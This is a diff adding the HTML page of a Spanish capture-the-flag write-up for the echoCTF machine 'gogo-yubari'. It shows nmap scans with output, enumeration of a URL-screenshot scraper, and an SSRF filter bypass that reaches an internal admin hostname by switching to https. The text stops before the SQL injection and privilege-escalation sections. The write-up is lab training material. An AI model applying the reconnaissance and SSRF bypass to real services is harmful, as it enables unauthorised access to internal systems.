+    <span class="md-ellipsis">
+      Ubicación de banderas
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notas-adicionales" class="md-nav__link">
+    <span class="md-ellipsis">
+      Notas adicionales
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Notas adicionales">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#eventos-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Eventos mysql
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#referencias" class="md-nav__link">
+    <span class="md-ellipsis">
+      Referencias
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+  
+<nav class="md-tags" >
+  
+    
+    
+    
+      <a href="../../../../tags/#server-side-request-forgery-ssrf" class="md-tag">Server Side Request Forgery (SSRF)</a>
+    
+  
+    
+    
+    
+      <a href="../../../../tags/#sql-injection" class="md-tag">SQL Injection</a>
+    
+  
+</nav>
+
+
+  
+  
+    
+      
+    
+    <a href="https://github.com/srrequiem/Secronomicon/raw/main/docs/echoCTF/Boxes/5 Experto/Gogo Yubari/README.md" title="Ver código fuente de esta página" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="gogo-yubari">Gogo Yubari <!-- omit from toc --></h1>
+<p>Write-up de la máquina gogo-yubari de <a href="https://echoCTF.red">echoCTF</a>.</p>
+<p><img alt="Cover de gogo-yubari" src="images/cover.png" /></p>
+<h2 id="indice">Índice <!-- omit from toc --></h2>
+<ul>
+<li><a href="#introducción">Introducción</a></li>
+<li><a href="#estadísticas">Estadísticas</a></li>
+<li><a href="#reconocimiento">Reconocimiento</a></li>
+<li><a href="#escaneo-de-host">Escaneo de host</a><ul>
+<li><a href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></li>
+<li><a href="#escaneo-específico">Escaneo específico</a></li>
+</ul>
+</li>
+<li><a href="#enumeración">Enumeración</a></li>
+<li><a href="#servicios">Servicios</a><ul>
+<li><a href="#http---8080">http - 8080</a></li>
+</ul>
+</li>
+<li><a href="#explotación">Explotación</a></li>
+<li><a href="#ssrf">SSRF</a></li>
+<li><a href="#sqli">SQLi</a></li>
+<li><a href="#post-explotación">Post Explotación</a></li>
+<li><a href="#escalación-de-privilegios">Escalación de privilegios</a><ul>
+<li><a href="#mysql--root">mysql → root</a></li>
+</ul>
+</li>
+<li><a href="#ubicación-de-banderas">Ubicación de banderas</a></li>
+<li><a href="#notas-adicionales">Notas adicionales</a></li>
+<li><a href="#eventos-mysql">Eventos <code>mysql</code></a></li>
+<li><a href="#referencias">Referencias</a></li>
+</ul>
+<h2 id="introduccion">Introducción</h2>
+<h3 id="estadisticas">Estadísticas</h3>
+<table>
+<thead>
+<tr>
+<th>Característica</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nombre</td>
+<td><a href="https://echoctf.red/target/14">gogo-yubari</a></td>
+</tr>
+<tr>
+<td>Dificultad</td>
+<td>Expert</td>
+</tr>
+<tr>
+<td>Banderas</td>
+<td>11 (7: other, 2: system, env, root)</td>
+</tr>
+<tr>
+<td>Puntos</td>
+<td>6,600: (other: 1,600, system: 2,600, env: 900, root: 1,500)</td>
+</tr>
+<tr>
+<td>Descripción/Pistas</td>
+<td>Gogo Yubari the web scrapper, named after the famous assassin, scraps echocity-f.com for validation of usability rules by producing a screenshot of the site.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<h3 id="escaneo-de-host">Escaneo de host</h3>
+<h4 id="escaneo-completo-de-puertos">Escaneo completo de puertos</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>└─$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-v<span class="w"> </span>-p-<span class="w"> </span>-open<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-oG<span class="w"> </span>nmap/all_ports_ss<span class="w"> </span><span class="nv">$TARGET</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Host<span class="w"> </span>discovery<span class="w"> </span>disabled<span class="w"> </span><span class="o">(</span>-Pn<span class="o">)</span>.<span class="w"> </span>All<span class="w"> </span>addresses<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>marked<span class="w"> </span><span class="s1">&#39;up&#39;</span><span class="w"> </span>and<span class="w"> </span>scan<span class="w"> </span><span class="nb">times</span><span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>slower.
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.92<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-01-25<span class="w"> </span><span class="m">23</span>:17<span class="w"> </span>EST
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Initiating<span class="w"> </span>SYN<span class="w"> </span>Stealth<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">23</span>:17
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Scanning<span class="w"> </span><span class="m">10</span>.0.200.69<span class="w"> </span><span class="o">[</span><span class="m">65535</span><span class="w"> </span>ports<span class="o">]</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Discovered<span class="w"> </span>open<span class="w"> </span>port<span class="w"> </span><span class="m">8080</span>/tcp<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.0.200.69
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>Completed<span class="w"> </span>SYN<span class="w"> </span>Stealth<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">23</span>:17,<span class="w"> </span><span class="m">17</span>.74s<span class="w"> </span>elapsed<span class="w"> </span><span class="o">(</span><span class="m">65535</span><span class="w"> </span>total<span class="w"> </span>ports<span class="o">)</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.0.200.69
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.15s<span class="w"> </span>latency<span class="o">)</span>.
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">61724</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>,<span class="w"> </span><span class="m">3810</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Some<span class="w"> </span>closed<span class="w"> </span>ports<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>reported<span class="w"> </span>as<span class="w"> </span>filtered<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>--defeat-rst-ratelimit
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-proxy
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>Read<span class="w"> </span>data<span class="w"> </span>files<span class="w"> </span>from:<span class="w"> </span>/usr/bin/../share/nmap
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">17</span>.82<span class="w"> </span>seconds
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">           </span>Raw<span class="w"> </span>packets<span class="w"> </span>sent:<span class="w"> </span><span class="m">87925</span><span class="w"> </span><span class="o">(</span><span class="m">3</span>.869MB<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Rcvd:<span class="w"> </span><span class="m">66137</span><span class="w"> </span><span class="o">(</span><span class="m">2</span>.645MB<span class="o">)</span>
+</span></code></pre></div>
+<h4 id="escaneo-especifico">Escaneo específico</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>└─$<span class="w"> </span>nmap<span class="w"> </span>-sCV<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span><span class="w"> </span>-oN<span class="w"> </span>nmap/targeted<span class="w"> </span><span class="nv">$TARGET</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.92<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-01-25<span class="w"> </span><span class="m">23</span>:21<span class="w"> </span>EST
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.0.200.69
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.15s<span class="w"> </span>latency<span class="o">)</span>.
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">    </span>VERSION
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-proxy<span class="w"> </span>GoGo<span class="w"> </span>go<span class="w"> </span>v1.11.12
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="p">|</span><span class="w"> </span>fingerprint-strings:
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="p">|</span><span class="w">   </span>GetRequest:
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="p">|</span><span class="w">     </span>HTTP/1.0<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="p">|</span><span class="w">     </span>Server:<span class="w"> </span>GoGo<span class="w"> </span>go<span class="w"> </span>v1.11.12
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="p">|</span><span class="w">     </span>Date:<span class="w"> </span>Thu,<span class="w"> </span><span class="m">26</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">04</span>:21:46<span class="w"> </span>GMT
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="p">|</span><span class="w">     </span>Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="p">|</span><span class="w">     </span>&lt;!DOCTYPE<span class="w"> </span>html&gt;
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="p">|</span><span class="w">     </span>&lt;html&gt;
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="p">|</span><span class="w">     </span>&lt;head&gt;
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="p">|</span><span class="w">     </span>&lt;title&gt;Gogo<span class="w"> </span>Yubari<span class="w"> </span>URL<span class="w"> </span>Cralwer&lt;/title&gt;
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="p">|</span><span class="w">     </span>&lt;style&gt;
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="p">|</span><span class="w">     </span>main<span class="w"> </span><span class="o">{</span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="p">|</span><span class="w">     </span>font-family:<span class="w"> </span>monospace,<span class="w"> </span>monospace<span class="p">;</span>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="p">|</span><span class="w">     </span>max-width:<span class="w"> </span>38rem<span class="p">;</span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="p">|</span><span class="w">     </span>padding:<span class="w"> </span>2rem<span class="p">;</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="p">|</span><span class="w">     </span>margin:<span class="w"> </span>auto<span class="p">;</span>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="p">|</span><span class="w">     </span>@media<span class="w"> </span>only<span class="w"> </span>screen<span class="w"> </span>and<span class="w"> </span><span class="o">(</span>max-device-width:<span class="w"> </span>736px<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="p">|</span><span class="w">     </span>main<span class="w"> </span><span class="o">{</span>
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="p">|</span><span class="w">     </span>padding:<span class="w"> </span>0rem<span class="p">;</span>
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="p">|</span><span class="w">     </span>::selection<span class="w"> </span><span class="o">{</span>
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="p">|</span><span class="w">     </span>background:<span class="w"> </span><span class="c1">#d3869b;</span>
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="p">|</span><span class="w">     </span>body<span class="w"> </span><span class="o">{</span>
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="p">|</span><span class="w">     </span>background:<span class="w"> </span><span class="c1">#282828;</span>
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="p">|</span><span class="w">     </span>color:<span class="w"> </span><span class="c1">#ebdbb2;</span>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="p">|</span><span class="w">     </span>background-color:<span class="w"> </span><span class="c1">#3c3836;</span>
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="p">|</span><span class="w">     </span>padding:<span class="w"> </span>1em<span class="p">;</span>
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="p">|</span><span class="w">     </span>border:<span class="w"> </span><span class="m">0</span><span class="p">;</span>
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="p">|</span><span class="w">     </span>a:active,<span class="w"> </span>a:visited<span class="w"> </span><span class="o">{</span>
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="p">|</span><span class="w">     </span>color:<span class="w"> </span><span class="c1">#b16286;</span>
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="p">|</span>_<span class="w">    </span>background-color:<span class="w"> </span><span class="c1">#1d2021;</span>
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="p">|</span>_http-title:<span class="w"> </span>Gogo<span class="w"> </span>Yubari<span class="w"> </span>URL<span class="w"> </span>Cralwer
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>GoGo<span class="w"> </span>go<span class="w"> </span>v1.11.12
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="m">1</span><span class="w"> </span>service<span class="w"> </span>unrecognized<span class="w"> </span>despite<span class="w"> </span>returning<span class="w"> </span>data.<span class="w"> </span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>the<span class="w"> </span>service/version,<span class="w"> </span>please<span class="w"> </span>submit<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>fingerprint<span class="w"> </span>at<span class="w"> </span>https://nmap.org/cgi-bin/submit.cgi?new-service<span class="w"> </span>:
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>SF-Port8080-TCP:V<span class="o">=</span><span class="m">7</span>.92%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">1</span>/25%Time<span class="o">=</span>63D1FFDA%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Ge
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>SF:tRequest,B67,<span class="s2">&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20GoGo\x20go\x20v1\.11</span>
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="s2">SF:\.12\r\nDate:\x20Thu,\x2026\x20Jan\x202023\x2004:21:46\x20GMT\r\nConten</span>
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="s2">SF:t-Type:\x20text/html;\x20charset=utf-8\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html</span>
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="s2">SF:&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Gogo\</span>
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="s2">SF:x20Yubari\x20URL\x20Cralwer&lt;/title&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;s</span>
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="s2">SF:tyle&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20main\x20{\n\x20\x20\x20\</span>
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="s2">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20monospace,\x20monosp</span>
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a><span class="s2">SF:ace;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x2038r</span>
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a><span class="s2">SF:em;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x202rem;\</span>
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a><span class="s2">SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x20auto;\n\x20</span>
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="s2">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x</span>
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="s2">SF:20\x20\x20@media\x20only\x20screen\x20and\x20\(max-device-width:\x20736</span>
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a><span class="s2">SF:px\)\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20main\x20{\n\</span>
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a><span class="s2">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200rem</span>
+</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a><span class="s2">SF:;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\</span>
+</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a><span class="s2">SF:x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::s</span>
+</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a><span class="s2">SF:election\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backgrou</span>
+</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a><span class="s2">SF:nd:\x20#d3869b;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\</span>
+</span><span id="__span-1-60"><a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a><span class="s2">SF:x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\</span>
+</span><span id="__span-1-61"><a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a><span class="s2">SF:x20\x20\x20\x20\x20background:\x20#282828;\n\x20\x20\x20\x20\x20\x20\x2</span>
+</span><span id="__span-1-62"><a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a><span class="s2">SF:0\x20\x20\x20\x20\x20color:\x20\x20\x20\x20\x20\x20#ebdbb2;\n\x20\x20\x</span>
+</span><span id="__span-1-63"><a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a><span class="s2">SF:20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20</span>
+</span><span id="__span-1-64"><a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a><span class="s2">SF:\x20pre\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backgroun</span>
+</span><span id="__span-1-65"><a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a><span class="s2">SF:d-color:\x20#3c3836;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p</span>
+</span><span id="__span-1-66"><a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a><span class="s2">SF:adding:\x201em;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border</span>
+</span><span id="__span-1-67"><a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a><span class="s2">SF::\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\</span>
+</span><span id="__span-1-68"><a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a><span class="s2">SF:x20\x20\x20\x20\x20\x20a,\x20a:active,\x20a:visited\x20{\n\x20\x20\x20\</span>
+</span><span id="__span-1-69"><a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a><span class="s2">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#b16286;\n\x20\x20\x20\x20</span>
+</span><span id="__span-1-70"><a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a><span class="s2">SF:\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#1d2021;\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span id="__span-1-71"><a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a>
+</span><span id="__span-1-72"><a id="__codelineno-1-72" name="__codelineno-1-72" href="#__codelineno-1-72"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+</span><span id="__span-1-73"><a id="__codelineno-1-73" name="__codelineno-1-73" href="#__codelineno-1-73"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">105</span>.59<span class="w"> </span>seconds
+</span></code></pre></div>
+<h2 id="enumeracion">Enumeración</h2>
+<h3 id="servicios">Servicios</h3>
+<h4 id="http-8080">http - 8080</h4>
+<p>En la página principal se presenta una utilidad para realizar <a href="https://es.wikipedia.org/wiki/Web_scraping">web-scrapping</a> mediante una URL la cuál se permite proporcionar.</p>
+<p><img alt="Página principal" src="images/enum_1.png" /></p>
+<p>A través del código fuente se expone un hostname interno (consola de administrador).</p>
+<p><img alt="Hostname interno" src="images/enum_2.png" /></p>
+<p>Después de enviar un formulario con la URL que puede ser enviada, se puede identificar que sólo acepta peticiones que puedan ser identificadas como internas dado que se genera una imagen en <code>/public/&lt;ip&gt;.png</code> en caso de que sea procesada correctamente, en caso contrario, la ruta de la imagen será <code>/fullscreenshot.png</code>.</p>
+<h2 id="explotacion">Explotación</h2>
+<h3 id="ssrf">SSRF</h3>
+<p>Después de probar con numerosos payloads modificando valores de cabeceras de la petición (<code>Host</code>, <code>X-Forwarder-For</code>, etc.) se identificó que se logra hacer un bypass interno al sitio usando <code>https</code> en vez de <code>http</code> en la URL proveída. Por lo que al usar <code>https://localhost.echocity-f.com/</code> se genera una imagen correctamente con su respuesta.</p>
+<p><img alt="Respuesta válida" src="images/exploit_1.png" /></p>
